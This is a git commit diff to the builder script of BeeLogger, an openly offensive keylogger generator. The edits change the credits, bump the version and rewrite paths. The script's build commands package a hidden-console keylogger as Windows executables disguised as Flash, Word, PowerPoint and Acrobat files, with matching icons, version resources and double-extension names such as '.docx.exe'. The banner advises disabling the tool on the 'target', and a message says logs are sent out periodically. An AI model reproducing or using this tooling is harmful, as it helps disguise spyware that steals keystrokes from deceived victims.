ee44572568072d5fb5cfb4fbbeeadb6644bcccbb
Ali Shokoohi <p4tprogrammer@gmail.com>
2017-12-27 08:38:41 +0330

    Update bee.py

--- bee.py
+++ bee.py
@@ -48,7 +48,7 @@ def warn():
             \ (     ) /                    DISABLE IT ON 
  ____________(%%%%%%%)____________                 TARGET IN MSCONFIG !
 (     /   /  )%%%%%%%(  \   \     )
-(___/___/__/           \__\___\___)     https://github.com/4w4k3/BeeLogger
+(___/___/__/           \__\___\___)     https://github.com/ali-shokoohi/BeeLogger
    (     /  / (%%%%%%) \  \     ) 
     (__/___/   (%%%%)  \___\__)                 
 ''' + RED + '''       [ Disclaimer Alert ]''' + YELLOW +  ''' 
@@ -62,9 +62,9 @@ def heading():
     sys.stdout.write(YELLOW + '''
 
                 .' '. I BEE YOU  __
-       .        .   .          \(__\_/             Version: 2.3
+       .        .   .          \(__\_/             Version: 2.4
         .         .         . -{{#(|8)
-          ' .  . ' ' .  . '    /(__/ \      by:''' + WHITE + ' Alisson Moretto (' + YELLOW + '4w4k3' + WHITE + ')' + '\n' + '\n' + END) 
+          ' .  . ' ' .  . '    /(__/ \     Improved by:''' + WHITE + ' Ali Shokoohi (' + YELLOW + 'ali-shokoohi' + WHITE + ')' + '\n' + '\n' + END) 
     print ' {0}[{1}K{0}]{1} Generate Keylogger  {0}[{1}U{0}]{1} Update  {0}[{1}Q{0}]{1} Quit  '.format(YELLOW, WHITE) + '\n'
 def pp():
     sys.stdout.write(GREEN + '''Thank You for using Bee, Think Great, Fly High!  \n''' + END)
@@ -92,17 +92,17 @@ def main():
                 print '\n {0}This keylogger send logs when logs > 50 chars or each 120 seconds.{1}'.format(BLUE, END)
             if choice.upper() == '6':
                 begin()
-                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m Manifest/manifest.manifest -F k.py')
+                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
                 heading()
-                os.system('sudo rm -Rf Templates/k_enc.py')
+                os.system('rm -Rf $HOME/BeeLogger/Templates/k_enc.py')
                 print '\n {0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             if choice == '1':
                 begin()
-                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.Bee -i Icons/flash.ico -F k.py')
+                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest --version-file=$HOME/BeeLogger/Resource/adobe.Bee -i $HOME/BeeLogger/Icons/flash.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Flash_.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
@@ -111,7 +111,7 @@ def main():
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name           
             elif choice == '2':
                 begin()
-                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.Bee -i Icons/word.ico -F k.py')
+                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest --version-file=$HOME/BeeLogger/Resource/word.Bee -i $HOME/BeeLogger/Icons/word.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Word_.docx.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
@@ -129,7 +129,7 @@ def main():
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '4':
                 begin()
-                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.Bee -i Icons/powerpoint.ico -F k.py')
+                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest --version-file=$HOME/BeeLogger/Resource/powerpoint.Bee -i $HOME/BeeLogger/Icons/powerpoint.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_Power_.pptx.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
@@ -138,7 +138,7 @@ def main():
                 print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '5':
                 begin()
-                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.Bee -i Icons/acrobat.ico -F k.py')
+                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest --version-file=$HOME/BeeLogger/Resource/acrobat.Bee -i $HOME/BeeLogger/Icons/acrobat.ico -F k.py')
                 os.system('rm -Rf build k.spec k.py')
                 name = 'Bee_AcrobatPDF_.pdf.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
